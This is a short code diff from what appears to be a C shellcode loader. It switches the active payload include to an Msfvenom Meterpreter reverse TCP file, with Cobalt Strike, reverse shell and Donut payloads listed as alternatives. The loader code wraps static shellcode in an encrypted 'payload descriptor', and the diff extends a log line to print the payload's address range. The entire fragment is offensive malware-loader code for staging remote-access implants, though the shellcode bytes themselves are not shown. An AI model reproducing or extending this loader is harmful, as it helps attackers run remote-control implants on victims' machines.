@@ -76,7 +76,8 @@
  * 
  * Our custom shellcode is loaded from `Shellcode.c` for easy adjustability.
  */
-#include "shellcode/Custom-Storage-1.c" // Working
+// #include "shellcode/Custom-Storage-1.c" // Working
+// #include "shellcode/Custom-Syscall-1.c" // Working
 // #include "shellcode/Custom-ArgumentOnStack-1.c" // Working
 // #include "shellcode/Custom-AccessViolation-1.c" // Working
 // #include "shellcode/Custom-ArgumentAsString-1.c" // Working
@@ -85,7 +86,7 @@
 // #include "shellcode/Msfvenom-WinExec-1.c" // Working
 // #include "shellcode/Msfvenom-ShellReverseTCP-1.c" // Working? (from C:\ drive)
 // #include "shellcode/Msfvenom-MeterpreterReverseTCP-2.c" // Working
-// #include "shellcode/Msfvenom-MeterpreterReverseTCP-1.c" // Not working
+#include "shellcode/Msfvenom-MeterpreterReverseTCP-1.c" // Not working
 // #include "shellcode/Proprietary-CobaltStrike-StagelessHTTP-1.c" // Not working
 // #include "shellcode/Donut-MessageBoxA-1.c" // Not working
 
@@ -211,7 +212,7 @@ void main(int argc, char** argv) {
     PRINT_SUCCESS("Creating Payload Descriptor (PD) and the `%s` payload within it.", STATIC_SHELLCODE_NAME);
     if (NT_SUCCESS(dwResult = CreatePayloadAndDescriptor((uint8_t*) &StaticShellcode, sizeof(StaticShellcode), (uint8_t*) &StaticPassword, sizeof(StaticPassword), STATIC_SHELLCODE_IS_ALREADY_ENCRYPTED, &lpPD))) {
         PRINT_SUCCESS("Succesfully created the Payload Descriptor (PD) with a size of %d bytes.", lpPD.dwPayloadSize);
-        PRINT_SUCCESS("Base address of payload is %p.", lpPD.lpPayload);
+        PRINT_SUCCESS("Base address of payload is 0x%p (ending at 0x%p).", lpPD.lpPayload, lpPD.lpPayload + lpPD.dwPayloadSize);
     } else {
         PRINT_FAILURE_AND_ABORT("Could not create the Payload Descriptor (PD) and the payload within it: 0x%X.", dwResult);
     }
